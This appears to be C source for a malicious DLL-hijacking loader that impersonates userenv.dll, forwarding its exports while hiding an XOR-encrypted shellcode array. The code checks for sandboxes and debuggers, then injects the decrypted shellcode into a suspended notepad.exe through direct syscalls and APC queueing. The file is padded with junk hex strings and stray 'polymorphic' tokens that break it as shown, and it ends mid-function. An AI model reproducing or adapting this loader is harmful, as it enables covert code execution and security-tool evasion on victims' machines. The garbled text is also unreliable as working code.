
    #include <stdio.h>
    #include <stdlib.h>
    #include "syscalls.h"

    #define _CRT_SECURE_NO_DEPRECATE
    #pragma warning (disable : 4996)

    //Here we specify the DLL exports of whatever dll we want to use in this case userenv.dll
    //We must use sharpdllproxy to auto make us a C file which will include all this exports.
    //In the Assembly code we used some nop instructions with the help of some registers which will change the pattern of how syswhispers calls the syscalls
    
    
            sleep(0);
            
    
    //here DLL exports are specified based an the user choice either MS Teams || OneDrive

    
#pragma comment(linker, "/export:=tmpB0F7.,@104")
#pragma comment(linker, "/export:RsopLoggingEnabled=tmpB0F7.RsopLoggingEnabled,@105")
#pragma comment(linker, "/export:AreThereVisibleLogoffScripts=tmpB0F7.AreThereVisibleLogoffScripts,@106")
#pragma comment(linker, "/export:AreThereVisibleShutdownScripts=tmpB0F7.AreThereVisibleShutdownScripts,@107")
#pragma comment(linker, "/export:CreateAppContainerProfile=tmpB0F7.CreateAppContainerProfile,@108")
#pragma comment(linker, "/export:CreateEnvironmentBlock=tmpB0F7.CreateEnvironmentBlock,@109")
#pragma comment(linker, "/export:CreateProfile=tmpB0F7.CreateProfile,@110")
#pragma comment(linker, "/export:DeleteAppContainerProfile=tmpB0F7.DeleteAppContainerProfile,@111")
#pragma comment(linker, "/export:DeleteProfileA=tmpB0F7.DeleteProfileA,@112")
#pragma comment(linker, "/export:DeleteProfileW=tmpB0F7.DeleteProfileW,@113")
#pragma comment(linker, "/export:DeriveAppContainerSidFromAppContainerName=tmpB0F7.DeriveAppContainerSidFromAppContainerName,@114")
#pragma comment(linker, "/export:DeriveRestrictedAppContainerSidFromAppContainerSidAndRestrictedName=tmpB0F7.DeriveRestrictedAppContainerSidFromAppContainerSidAndRestrictedName,@115")
#pragma comment(linker, "/export:DestroyEnvironmentBlock=tmpB0F7.DestroyEnvironmentBlock,@116")
#pragma comment(linker, "/export:DllCanUnloadNow=tmpB0F7.DllCanUnloadNow,@117")
#pragma comment(linker, "/export:DllGetClassObject=tmpB0F7.DllGetClassObject,@118")
#pragma comment(linker, "/export:DllRegisterServer=tmpB0F7.DllRegisterServer,@119")
#pragma comment(linker, "/export:DllUnregisterServer=tmpB0F7.DllUnregisterServer,@120")
#pragma comment(linker, "/export:EnterCriticalPolicySection=tmpB0F7.EnterCriticalPolicySection,@121")
#pragma comment(linker, "/export:=tmpB0F7.,@122")
#pragma comment(linker, "/export:ExpandEnvironmentStringsForUserA=tmpB0F7.ExpandEnvironmentStringsForUserA,@123")
#pragma comment(linker, "/export:ExpandEnvironmentStringsForUserW=tmpB0F7.ExpandEnvironmentStringsForUserW,@124")
#pragma comment(linker, "/export:ForceSyncFgPolicy=tmpB0F7.ForceSyncFgPolicy,@125")
#pragma comment(linker, "/export:FreeGPOListA=tmpB0F7.FreeGPOListA,@126")
#pragma comment(linker, "/export:FreeGPOListW=tmpB0F7.FreeGPOListW,@127")
#pragma comment(linker, "/export:GenerateGPNotification=tmpB0F7.GenerateGPNotification,@128")
#pragma comment(linker, "/export:GetAllUsersProfileDirectoryA=tmpB0F7.GetAllUsersProfileDirectoryA,@129")
#pragma comment(linker, "/export:GetAllUsersProfileDirectoryW=tmpB0F7.GetAllUsersProfileDirectoryW,@130")
#pragma comment(linker, "/export:GetAppContainerFolderPath=tmpB0F7.GetAppContainerFolderPath,@131")
#pragma comment(linker, "/export:GetAppContainerRegistryLocation=tmpB0F7.GetAppContainerRegistryLocation,@132")
#pragma comment(linker, "/export:GetAppliedGPOListA=tmpB0F7.GetAppliedGPOListA,@133")
#pragma comment(linker, "/export:GetAppliedGPOListW=tmpB0F7.GetAppliedGPOListW,@134")
#pragma comment(linker, "/export:=tmpB0F7.,@135")
#pragma comment(linker, "/export:GetDefaultUserProfileDirectoryA=tmpB0F7.GetDefaultUserProfileDirectoryA,@136")
#pragma comment(linker, "/export:=tmpB0F7.,@137")
#pragma comment(linker, "/export:GetDefaultUserProfileDirectoryW=tmpB0F7.GetDefaultUserProfileDirectoryW,@138")
#pragma comment(linker, "/export:=tmpB0F7.,@139")
#pragma comment(linker, "/export:GetGPOListA=tmpB0F7.GetGPOListA,@140")
#pragma comment(linker, "/export:GetGPOListW=tmpB0F7.GetGPOListW,@141")
#pragma comment(linker, "/export:GetNextFgPolicyRefreshInfo=tmpB0F7.GetNextFgPolicyRefreshInfo,@142")
#pragma comment(linker, "/export:GetPreviousFgPolicyRefreshInfo=tmpB0F7.GetPreviousFgPolicyRefreshInfo,@143")
#pragma comment(linker, "/export:GetProfileType=tmpB0F7.GetProfileType,@144")
#pragma comment(linker, "/export:GetProfilesDirectoryA=tmpB0F7.GetProfilesDirectoryA,@145")
#pragma comment(linker, "/export:GetProfilesDirectoryW=tmpB0F7.GetProfilesDirectoryW,@146")
#pragma comment(linker, "/export:GetUserProfileDirectoryA=tmpB0F7.GetUserProfileDirectoryA,@147")
#pragma comment(linker, "/export:GetUserProfileDirectoryW=tmpB0F7.GetUserProfileDirectoryW,@148")
#pragma comment(linker, "/export:HasPolicyForegroundProcessingCompleted=tmpB0F7.HasPolicyForegroundProcessingCompleted,@149")
#pragma comment(linker, "/export:LeaveCriticalPolicySection=tmpB0F7.LeaveCriticalPolicySection,@150")
#pragma comment(linker, "/export:LoadProfileExtender=tmpB0F7.LoadProfileExtender,@151")
#pragma comment(linker, "/export:LoadUserProfileA=tmpB0F7.LoadUserProfileA,@152")
#pragma comment(linker, "/export:LoadUserProfileW=tmpB0F7.LoadUserProfileW,@153")
#pragma comment(linker, "/export:ProcessGroupPolicyCompleted=tmpB0F7.ProcessGroupPolicyCompleted,@154")
#pragma comment(linker, "/export:ProcessGroupPolicyCompletedEx=tmpB0F7.ProcessGroupPolicyCompletedEx,@155")
#pragma comment(linker, "/export:RefreshPolicy=tmpB0F7.RefreshPolicy,@156")
#pragma comment(linker, "/export:RefreshPolicyEx=tmpB0F7.RefreshPolicyEx,@157")
#pragma comment(linker, "/export:RegisterGPNotification=tmpB0F7.RegisterGPNotification,@158")
#pragma comment(linker, "/export:RsopAccessCheckByType=tmpB0F7.RsopAccessCheckByType,@159")
#pragma comment(linker, "/export:RsopFileAccessCheck=tmpB0F7.RsopFileAccessCheck,@160")
#pragma comment(linker, "/export:RsopResetPolicySettingStatus=tmpB0F7.RsopResetPolicySettingStatus,@161")
#pragma comment(linker, "/export:RsopSetPolicySettingStatus=tmpB0F7.RsopSetPolicySettingStatus,@162")
#pragma comment(linker, "/export:UnloadProfileExtender=tmpB0F7.UnloadProfileExtender,@163")
#pragma comment(linker, "/export:UnloadUserProfile=tmpB0F7.UnloadUserProfile,@164")
#pragma comment(linker, "/export:UnregisterGPNotification=tmpB0F7.UnregisterGPNotification,@165")
#pragma comment(linker, "/export:WaitForMachinePolicyForegroundProcessing=tmpB0F7.WaitForMachinePolicyForegroundProcessing,@166")
#pragma comment(linker, "/export:WaitForUserPolicyForegroundProcessing=tmpB0F7.WaitForUserPolicyForegroundProcessing,@167")
#pragma comment(linker, "/export:=tmpB0F7.,@168")
#pragma comment(linker, "/export:=tmpB0F7.,@169")
#pragma comment(linker, "/export:=tmpB0F7.,@170")
#pragma comment(linker, "/export:=tmpB0F7.,@171")
#pragma comment(linker, "/export:=tmpB0F7.,@172")
#pragma comment(linker, "/export:=tmpB0F7.,@173")
#pragma comment(linker, "/export:=tmpB0F7.,@174")
#pragma comment(linker, "/export:=tmpB0F7.,@175")
#pragma comment(linker, "/export:=tmpB0F7.,@176")
#pragma comment(linker, "/export:=tmpB0F7.,@177")
#pragma comment(linker, "/export:=tmpB0F7.,@178")
#pragma comment(linker, "/export:=tmpB0F7.,@179")
#pragma comment(linker, "/export:=tmpB0F7.,@180")
#pragma comment(linker, "/export:=tmpB0F7.,@181")
#pragma comment(linker, "/export:=tmpB0F7.,@182")
#pragma comment(linker, "/export:=tmpB0F7.,@183")
#pragma comment(linker, "/export:=tmpB0F7.,@184")
#pragma comment(linker, "/export:=tmpB0F7.,@185")
#pragma comment(linker, "/export:=tmpB0F7.,@186")
#pragma comment(linker, "/export:=tmpB0F7.,@187")
#pragma comment(linker, "/export:=tmpB0F7.,@188")
#pragma comment(linker, "/export:=tmpB0F7.,@189")
#pragma comment(linker, "/export:=tmpB0F7.,@190")
#pragma comment(linker, "/export:=tmpB0F7.,@191")
#pragma comment(linker, "/export:=tmpB0F7.,@192")
#pragma comment(linker, "/export:=tmpB0F7.,@193")
#pragma comment(linker, "/export:=tmpB0F7.,@194")
#pragma comment(linker, "/export:=tmpB0F7.,@195")
#pragma comment(linker, "/export:=tmpB0F7.,@196")
#pragma comment(linker, "/export:=tmpB0F7.,@197")
#pragma comment(linker, "/export:=tmpB0F7.,@198")
#pragma comment(linker, "/export:=tmpB0F7.,@199")
#pragma comment(linker, "/export:=tmpB0F7.,@200")
#pragma comment(linker, "/export:=tmpB0F7.,@201")
#pragma comment(linker, "/export:=tmpB0F7.,@202")
#pragma comment(linker, "/export:=tmpB0F7.,@203")
#pragma comment(linker, "/export:=tmpB0F7.,@204")
#pragma comment(linker, "/export:=tmpB0F7.,@205")
#pragma comment(linker, "/export:=tmpB0F7.,@206")
#pragma comment(linker, "/export:=tmpB0F7.,@207")
#pragma comment(linker, "/export:=tmpB0F7.,@208")
#pragma comment(linker, "/export:=tmpB0F7.,@209")
#pragma comment(linker, "/export:=tmpB0F7.,@210")
#pragma comment(linker, "/export:=tmpB0F7.,@211")
#pragma comment(linker, "/export:=tmpB0F7.,@212")
#pragma comment(linker, "/export:=tmpB0F7.,@213")
#pragma comment(linker, "/export:=tmpB0F7.,@214")
#pragma comment(linker, "/export:=tmpB0F7.,@215")
#pragma comment(linker, "/export:=tmpB0F7.,@216")
#pragma comment(linker, "/export:=tmpB0F7.,@217")
#pragma comment(linker, "/export:=tmpB0F7.,@218")
#pragma comment(linker, "/export:=tmpB0F7.,@219")


    BOOL executed = FALSE;

    //decryption
    
        5h6PijH7JIsvGz4oQA="ac3bf7d6b3ae1bb42562d4919a176e32da6a4c0f579f0d16a7719da1e4927d9f90a9e7c1b0eed97055e9d9bcf6d8335daa3363e4f46e794e70f306272f22bc94416333899311866ca4330da4a11d27dafe86105bbe13f5cff83b6dc1f33eceed2bd34bc6aea705525990d580e404f50053f74c034468c968d9e6ed081c8daf545ba0558e91f518112e9e413fac25cc21107592924bb9845efc2a3ed5eb5d8362f94e510bc2d0581f1c78e48005b7942c55a9231e30c9a41f234d769508b3bb37064051f94dd39c1637f8da7bd02b5be1de962a370be292970206f296db0443525c2163be2955a61c2e93f605b585a48dad02e9ccccc99909ba6cb68ca1142939c1e245cd434f192462e427f4a1c5f9bf488c6d77fe35092949b8f342267d3ebcf5e8fe2e9a2b1da5b2878a406bc7f1b3772b0d1b399e7e1f0cb65942c5357b7241a90080ababa4dd32478b7820"
    
    
    void do_xor(unsigned char* data, size_t data_len, char* key, size_t key_len)
    {
        int j;
        j = 0;
        for (int i = 0; i < data_len; i++)
        {
            if (j == key_len - 1) j = 0;
            data[i] = data[i] ^ key[j];
            j++;
        }
    };
    
    
            sleep(1);
            
    
            polymorphic
            
    
    //Timing attack using waitable timers. 
    //Test fails if any of the calls return an error state.
    BOOL timing_CreateWaitableTimer(UINT delayInMillis)
    {
        HANDLE hTimer;
        LARGE_INTEGER dueTime;
        
        
        gwZRStG0Rlh="b2dc47e61f654202d4e86eb5ea42e36b06bc5ca50eed3c723eca8142e262896f09e94160ab2514de679884a060b57f01e4a44114649d57c45f29213fa6a84bcc666f9daa5dd6ed166ef71b90af260847483ffc14504e7f8c2656799c376dc77f25de107ecd8c26cb1c67082c1f9619a2f884ba16bda5ed37dbf015739d5e4ca4a6b48416a314201e014515aeef6d57979eff5b306531bc8a39167cb65fa6adf8e872824dc30d900d96787bbfd5e515538dfd40722391cb8fdfa31db911b48a5c8d7a179a84938d38b12909d60acf4b5df3d7bcc55bd1772836421de5195c0018c0dbec1d01765427f2f20ea64b21ea1e8c23553758cb0eee55789ae5d3064963b92195a108fcc7c36d8def299a9b7f74a58d3455a27de6c21f3e95ce151c324e2f7e06286e1ae2813c4806106acbeac0ae2f63f389c6446092881556df397c1e2ef2c505c54ae10f686692a510fd"
    
        
        BOOL bResult = FALSE;

        dueTime.QuadPart = delayInMillis * -10000LL;

        hTimer = CreateWaitableTimer(NULL, TRUE, NULL);
        
        
            polymorphic
            
        
        if (hTimer == NULL)
        {
            return TRUE;
        }
        
        
            polymorphic
            
        
        if (SetWaitableTimer(hTimer, &dueTime, 0, NULL, NULL, FALSE) == FALSE)
        {
            bResult = TRUE;
        }
        else {
            if (WaitForSingleObject(hTimer, INFINITE) != WAIT_OBJECT_0)
            {
                bResult = TRUE;
            }
            
            
            sleep(0);
            
        }
        
        
        3yraFwPVobh="aeda0810a4ba999cd1ae53db8a40c06efa3fe65f5592a5b609b90821178627291844a8eb6d0495298fce071a7ad559ca3dd4cf596e132ab066497af9ec9c08fb4e6a317243ed8f36558fd4a6176470a7153265365db54a610b7f4caf42c5845b767f881e1d062922c640e6ea6c0afbc95f65c13bb42ca582d400f9e95928403de9b30b27bf7984e0f8015685d7ed510c132ce68a137c9fe1497e22976df4f7e75dc7b32fefaf1826c15dcdf528b7c30eb651a617839517fe1ae7f6884e9d1224bd60860cef5b9064e99afbda590f315fd7b198721fc295490e4e6a2519399bf0e0e79f26f3cf2908833cd1062b4d1ca8551be59ed752900cc1419633fe995a7bf4a0bded751f1d4e23888fc6d7a23e327b756f81da4c818f042a9352a35b173eabe1b5a54cb3b9a65f314db3629a67d79f853ab2a2689a59992f7c676bbacbe8e07ca60215213e9470e2af77f5"
    
        
        CancelWaitableTimer(hTimer);
        CloseHandle(hTimer);
        
        
            sleep(0);
            
        
        return bResult;
    }
    
    //sandbox check to check hardrive 
    int gensandbox_drive_size() {
        GET_LENGTH_INFORMATION size;
        DWORD lpBytesReturned;
        
        
        W0c4FjLGOF="7a6950676866abae8e15830f7fdb4d71eaeeeca4656dd7d302cf0b092fc123849bdc47fa1ca5f35007a5714999ac724399db4713b33aea6d1f32edc4da7713f7f0fe9192c44a94ef5672c3eaa56bfbecab9a128c5becd1ba1f84e23e41dbb73fb6940087a6f2315a550a9d310d8b636d80c0f49ad6a29974c1ca59569c2624dea8b0f6ebcff2e60d35ae8a6b57e912c24836fbda1b4a518120d86a0ccdc02ca50e441061e9eaf1bd3bc56d21a84a868ccb653c873d232986e281bcf61e8a68365bd133f6f410605c31e076482710029aba84562a563925181c2b5de26bf6b27fcf0035de331fed565e04e5be05c823d4e0b3906ce7700e5c8800301546004e8563a4d6c6268aa24b2db5c598a37920552eea2e4433f6fca66781ee69293aa9ab12e7ca1dcb03b015bc48ca69f8a25fb817b6fdb27a541c9c5b908101d9e27fbf1fb085d94fee1189dd7705b45d"
    
        
        HANDLE drive = CreateFile(L"\\\\.\\PhysicalDrive0", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
        if (drive == INVALID_HANDLE_VALUE) {
            // Someone is playing tricks. Or not bob enough privileges.
            CloseHandle(drive);
            return FALSE;
        }
        
        
            polymorphic
            
        
        BOOL result = DeviceIoControl(drive, IOCTL_DISK_GET_LENGTH_INFO, NULL, 0, &size, sizeof(GET_LENGTH_INFORMATION), &lpBytesReturned, NULL);
        CloseHandle(drive);
        
        
            polymorphic
            

        if (result != 0) {
            if (size.Length.QuadPart / 1073741824 <= 60) /* <= 60 GB */
                return TRUE;
        }
        
        
        icvPD40iPOe="f5b6cff3e5847aa012d5603b9edaa3f04630778c6784195ec91485a4e0facd746a560867803ce035e83b10ba21fef0afc17b9c0f60079e5c0a005959e9436ca9c51c09a26ac06efe36fb31fc1a83e388e86ed9510dd964441c6bd38d968ebae17afec0f506e364fcaf3a05ed769c5efe572ff8f66d776e64f6d7b87085fc3554737682a113d093f78cd4eb4b0d51ec86d1738a32355ee1f995bc56dba1dbf18456c2188408e05cc7231252ff543d4a8b9b18fbb9579e0149cd6ca7d9a34dfa7621970fa4703d0a2e2c9341cec798b706d85e03bd05fbe750850dbbb02ceeb47d007fa15df69445f91c6e132e8e721b90129d23dfa45727e9091721f218112182c9d837e5cc5a98d7a46660ecfe5c458e248a5a670a8e5c9ce1388515d8608566b3862ef0c2bb781d07ad65a97b77435717e6ae840c51390e3451fa96c2b70c5437f771aafa3d449c65b1d7c044"
    

        return FALSE;
    }

    DWORD WINAPI DoMagic(LPVOID lpParameter)
    {
        
        lemzgNqpmLxUepsdmewS3Y1hy="20414860c9824be83b3f1d975ae66eeb90a55665ae891a1ff6863558b4b757924b5f1ff0a60deb678a4cae070cc78e4534efc1eb9cc57cda0160aa4aa70bed62f9a84d1343d9f4e24a1f78bb495f68adb27d25e89d745139aa99d1ca3a47b37b0cfbe83d30a02288ba8c9ee2026cb1f9556822a945f5890f3e07bf875345fefcbc9868bd2b7da63ee76332aba1c6819af6f2fc8ae4a37e0f9c7c38aa672f24a654b94e7b6b1fc409ab27376705d3234e5c0ae746d6192a4de9866152ad392119913ecba55f2338e80963dd5c6f6d9b54a330c7d342ccce544c74e6ae31bd1858cec711cd749ca23c55dd4e0427284ad8acdd74abd7d8c80ffbf376dea9fa09f192c612b438055a8d6224eb1defdaf393e19c53972ef98ef8b2626a1b969a13234ede1f1a3b5789436fd3ab7472ece79d7f5042856804b8f103012c708723bbb255ebdbbc965f0cb8669ad8dd06"
    
        
    unsigned char bob[] = {
	0x71, 0x5a, 0x33, 0x03, 0x7d, 0xfa, 0x7c, 0xe7, 0x8d, 0x12, 0xf1, 0xb6, 0xcc, 0x42, 0xe2, 0xb6, 0xc5, 0x23, 0x62, 0xb1, 0xe8, 0x5a, 0x3b, 0xb5, 0xed, 0x5a, 0x3b, 0xb5, 0x95, 0x5a, 0x3b, 0xb5, 0xad, 0x5f, 0x81, 0x2e, 0xc5, 0x1d, 0x07, 0xad, 0xc7, 0x5a, 0x3b, 0x95, 0xdd, 0x5a, 0x81, 0x27, 0x21, 0x2e,
	0xd1, 0x9b, 0x8f, 0x3e, 0x90, 0xa6, 0x4c, 0xdb, 0xbd, 0xa6, 0x8c, 0xd3, 0x52, 0x0a, 0xdf, 0x5a, 0x3b, 0xb5, 0xad, 0x99, 0xf2, 0xdb, 0xcc, 0x43, 0xf8, 0xe6, 0x5d, 0x74, 0x31, 0x9f, 0x95, 0x19, 0xb2, 0xe8, 0x08, 0x60, 0xb0, 0xe7, 0x8d, 0x99, 0x30, 0x6f, 0x8d, 0x12, 0xb0, 0xaf, 0x08, 0xd2, 0xc4, 0x80,
	0xc5, 0x13, 0x60, 0x6c, 0xc5, 0x0a, 0xf4, 0x6c, 0xcd, 0x32, 0xe0, 0xae, 0x8c, 0xc2, 0x53, 0xb1, 0xc0, 0x23, 0x79, 0xaf, 0x72, 0xdb, 0xf1, 0x6c, 0xb9, 0x9a, 0xf8, 0xe6, 0x5b, 0x5a, 0x81, 0x27, 0x21, 0x53, 0x71, 0x2e, 0x80, 0x53, 0xb1, 0x26, 0xb5, 0xf2, 0xc5, 0x16, 0xc1, 0x11, 0xfc, 0xc3, 0x85, 0x57,
	0x89, 0x36, 0xf8, 0xca, 0xe8, 0xa3, 0x06, 0x52, 0x94, 0xae, 0x8c, 0xc2, 0xd6, 0xa6, 0x06, 0x1e, 0xf8, 0xa3, 0x06, 0x52, 0xac, 0xae, 0x8c, 0xc2, 0xf1, 0x6c, 0x89, 0x9a, 0xf8, 0xe6, 0x5d, 0x53, 0xe8, 0xa6, 0xd5, 0x4c, 0xe9, 0xbd, 0xcc, 0x4a, 0xf1, 0xbe, 0xcc, 0x48, 0xf8, 0x64, 0x61, 0x32, 0xf1, 0xb5,
	0x72, 0xf2, 0xe8, 0xa6, 0xd4, 0x48, 0xf8, 0x6c, 0x9f, 0xfb, 0xfb, 0x18, 0x72, 0xed, 0xed, 0xaf, 0xbc, 0xc9, 0xe3, 0xae, 0x33, 0x65, 0xd9, 0x89, 0xe4, 0x7c, 0xd5, 0x93, 0x8d, 0x53, 0xe6, 0xaf, 0x04, 0xf3, 0xf9, 0x20, 0x4f, 0x5e, 0xc7, 0xc1, 0x8a, 0xed, 0x65, 0xb4, 0xde, 0x5a, 0x39, 0x06, 0xde, 0x48,
	0xfd, 0xd6, 0x4d, 0x5f, 0x81, 0x2e, 0xde, 0x41, 0xf9, 0x5d, 0xb7, 0x44, 0xc9, 0x40, 0x8d, 0x12, 0xb0, 0xe7, 0x72, 0xc7, 0x58, 0xf7, 0x8d, 0x12, 0xb0, 0xd6, 0xb4, 0x20, 0x9e, 0xd6, 0xbb, 0x2a, 0x9e, 0xd6, 0xb8, 0x20, 0x9e, 0xd6, 0xbf, 0x2b, 0xb0, 0xbd, 0xc5, 0x9b, 0x71, 0xae, 0x4a, 0xd2, 0x0b, 0xe6,
	0x8d, 0x12, 0xfd, 0xd6, 0x44, 0x41, 0xe3, 0x8d, 0x8e, 0x41, 0xf9, 0x5d, 0xda, 0x9b, 0x2f, 0x21, 0x8d, 0x12, 0xb0, 0xe7, 0x72, 0xc7, 0x58, 0x40, 0x8d, 0x12, 0xb0, 0xc8, 0xec, 0x7d, 0xd2, 0x83, 0xff, 0x44, 0x82, 0xd0, 0xe4, 0x6a, 0xc0, 0xac, 0xc2, 0x22, 0xc3, 0xd2, 0xc1, 0x7c, 0x82, 0x80, 0xcb, 0x65,
	0xde, 0xde, 0xbf, 0x74, 0xe0, 0xb2, 0xe6, 0x78, 0xf2, 0x85, 0xe3, 0x5b, 0xf2, 0x88, 0xcc, 0x57, 0xdb, 0x9f, 0xe9, 0x66, 0x83, 0xd5, 0xa0, 0x79, 0x81, 0xd3, 0xc1, 0x47, 0xe1, 0x92, 0xc6, 0x61, 0xd9, 0x97, 0xb8, 0x6b, 0xca, 0x8d, 0xe0, 0x4a, 0xc7, 0xb5, 0xc2, 0x47, 0xfb, 0x95, 0xf4, 0x71, 0xef, 0xa9,
	0xc6, 0x7b, 0x83, 0xa2, 0xe7, 0x20, 0x80, 0xdf, 0xdc, 0x54, 0xef, 0xb2, 0xbc, 0x6b, 0xea, 0x97, 0xfc, 0x77, 0xdf, 0x88, 0xd2, 0x7c, 0xc3, 0xd7, 0xeb, 0x61, 0xe6, 0x88, 0xf9, 0x7b, 0xfc, 0x83, 0xe2, 0x7f, 0xc8, 0x93, 0xd4, 0x54, 0x81, 0xac, 0xfa, 0x27, 0xc1, 0x93, 0xd8, 0x48, 0xf1, 0xa3, 0xcf, 0x68,
	0xe2, 0xd7, 0xb9, 0x42, 0xd9, 0x97, 0xbd, 0x47, 0xc1, 0x9e, 0xc2, 0x73, 0xe0, 0xad, 0xfc, 0x24, 0xef, 0xab, 0xff, 0x42, 0xfd, 0xa4, 0xfe, 0x58, 0xd6, 0x92, 0xeb, 0x6a, 0xfe, 0xab, 0xe3, 0x54, 0xe7, 0x89, 0xe9, 0x70, 0xe0, 0xd1, 0xc3, 0x58, 0xde, 0xa0, 0xdf, 0x12, 0xf8, 0x6e, 0x4c, 0x41, 0xea, 0xa6,
	0xd5, 0x5f, 0x81, 0x2e, 0xde, 0x5a, 0x08, 0xe7, 0xbf, 0xba, 0x34, 0xe7, 0x8d, 0x12, 0xb0, 0xb7, 0xde, 0x41, 0xf9, 0x20, 0x4f, 0xf9, 0xe5, 0xc9, 0xb6, 0xed, 0x65, 0xaf, 0x04, 0xd4, 0xda, 0xed, 0xd2, 0x5a, 0x39, 0x16, 0xe7, 0x0d, 0xea, 0xb5, 0xe5, 0x92, 0x83, 0xe7, 0x8d, 0x5b, 0x39, 0x07, 0xe7, 0x16,
	0xf1, 0xbe, 0xc4, 0xa8, 0xc5, 0xa1, 0x13, 0x94, 0xb0, 0xe7, 0x8d, 0x12, 0x4f, 0x32, 0xc0, 0x23, 0x70, 0xb4, 0xd7, 0x5a, 0x39, 0x16, 0xc0, 0x23, 0x79, 0xaa, 0xbc, 0xdb, 0xe3, 0xb4, 0xc4, 0xd5, 0x72, 0xca, 0x8b, 0x0a, 0xcb, 0x18, 0x58, 0x97, 0x70, 0x92, 0x92, 0x5a, 0x77, 0x26, 0x05, 0x01, 0xb0, 0xe7,
	0xc4, 0xa8, 0xf4, 0x17, 0xb8, 0xf2, 0xb0, 0xe7, 0x8d, 0x12, 0x4f, 0x32, 0xc5, 0xed, 0x7f, 0x93, 0x8f, 0xf9, 0x1a, 0x0f, 0xd8, 0x12, 0xb0, 0xe7, 0xde, 0x4b, 0xda, 0xa7, 0xd7, 0x5b, 0x39, 0x36, 0x4c, 0xf0, 0xa0, 0xae, 0x4a, 0xd2, 0xb0, 0xf7, 0x8d, 0x12, 0xf9, 0x5d, 0xd5, 0xb6, 0xe3, 0x02, 0x8d, 0x12,
	0xb0, 0xe7, 0x72, 0xc7, 0xf8, 0x74, 0xde, 0x41, 0xf8, 0x6e, 0x6a, 0x5a, 0x39, 0x16, 0xc5, 0x9b, 0x6a, 0xae, 0x4a, 0xd2, 0xb0, 0xc7, 0x8d, 0x12, 0xf9, 0x6e, 0x74, 0x5b, 0x0a, 0xf5, 0x1b, 0x9b, 0x52, 0xe7, 0x8d, 0x12, 0xb0, 0x18, 0x58, 0x5a, 0x33, 0x23, 0xad, 0x97, 0x70, 0x93, 0x3f, 0x74, 0x3b, 0xe0,
	0xc5, 0x13, 0x73, 0x62, 0x4d, 0x67, 0x62, 0xbf, 0x4e, 0x4a, 0xda, 0xe7, 0xd4, 0x5b, 0x77, 0x25, 0x7d, 0xa7, 0x12, 0xb1, 0x72, 0xc7
};

            if (!executed)
            {
                
                
        RElgo9txHEa0t1lJpP958rTxQ="741955cd79320762fcc555d7f230eff3dc2a2d9b3732c8c7e0b2a9c9a76ddb98ec5e2b0b0b0d330bd7b71edb83d605469b73bc1ec7a3bd5fd756f90d5dcb27b4c5eaf1f135af04298c91d0ce67bb9ec78a9c97ed6503b9520a41ba3be76c9074a8c66d24f3973f0855b9e9915ff73d41dd99e918b83a5482945720de15d10bf1d5ae28fa03ff91c78cfc6251e0fb8b0c02a63ab50dcd93a402775b3cb0200b550f597a57179e23d05094bb918012d26ffcab63cc42a75970928851fc253bc02b8c5a8ea30ff2c50d27982c8eb65ef8bec1971ad6b6680a805e7e1228189a49a4c625537b0ca6a2849802733d1ffc2e7496e2eda39d8d6c584a2f9271dfc65e0334f5bc69e1476c9bb64cab191c510b58f8c8aa4dfc63eba48174f55c27a6b54e1ab7e3c189e0dd5d31692372a0ebca5624882ce144b91e7f9b8b61a43f7dc4b19bfaf98e927116f08b56de120e"
    
                
                executed = TRUE;

                LPVOID allocation_start;
                SIZE_T allocation_size = sizeof(bob);
                NTSTATUS status = NULL;
                
                
            sleep(0);
            
                
                allocation_start = nullptr;

                char klidikardias[] = "\x8d\x12\xb0\xe7";

                STARTUPINFOA si = { 0 };
                PROCESS_INFORMATION pi = { 0 };
                
                
        cxuVtU3f="b8fc8950d8f345f47e70e1ac5b5442adf0a39564b754749c037b5d485c5e4bb98d9db8515ca31911d518919276225839e8669526fdef310411b047fe149f4e802fb08dbcb24c4fc3bb5be532e860e0d2a649972f3acb26219254ae4c8af879035c8dfa9a519c0968fe039185eec28c811d2428a0700a6711ea5648c6290b6f3be5bd81bf94b8e3c790df95eba09326641091787d0874bce326a044a63de65c00341301220dfe89d84d0f118c1e3ea1c26a9ef12ede4bf58fc04ac9167baf578846bed1bc28a61bdfeaa1a07d9a02da7125d2219c4d8f1922df311dedd38e611e162c0faf780e1b12e7d5aaa93bac4891135599f0f9cabc0a822bfb19360e000d124d712b27f31889428af08bea656d2a8b78b99cd16b6d3d51fdafbc1fc5c159f516b1e3c0353de732c50c2081ede3addf1b2dc5e9300b21e67198bf35dc78a14aae97f24e6ced1abf4fba14e5"
    
                
                CreateProcessA("C:\\Windows\\system32\\notepad.exe", NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);
                HANDLE victimProcess = pi.hProcess;
                HANDLE threadHandle = pi.hThread;
                //delay execution
                timing_CreateWaitableTimer(5);

                            /*++

                    Routine Description:

                        CheckRemoteDebuggerPresent() is another Win32 Debugging API function;
                        it can be used to check if a remote process is being debugged. However,
                        we can also use this as another method for checking if our own process
                        is being debugged. This API internally calls the NTDLL export
                        NtQueryInformationProcess function with the PROCESSINFOCLASS set to
                        7 (ProcessDebugPort).

                    Arguments:
                        None
                    Return Value:

                        TRUE - if debugger was detected
                        FALSE - otherwise
                    --*/
                BOOL bIsDbgPresent = FALSE;
                DWORD oldProtect= NULL;
                CheckRemoteDebuggerPresent(GetCurrentProcess(), &bIsDbgPresent);
                // Allocate Virtual Memory 
                NtAllocateVirtualMemory(victimProcess, &allocation_start, 0, (PULONG64)&allocation_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
                
                
            polymorphic
            
              
               
         do_xor(bob, sizeof(bob), klidikardias, sizeof(klidikardias));
    

                // Copy shellcode into allocated memory
                NtWriteVirtualMemory(victimProcess, allocation_start, bob, sizeof(bob), 0);
                NtProtectVirtualMemory(victimProcess, &allocation_start, (PSIZE_T)&allocation_size, PAGE_EXECUTE_READ, &oldProtect);
                
                
            sleep(0);
            
                
                NtQueueApcThread(threadHandle, PKNORMAL_ROUTINE(allocation_start), allocation_start, NULL, NULL);
                NtResumeThread(threadHandle, NULL);
                
                
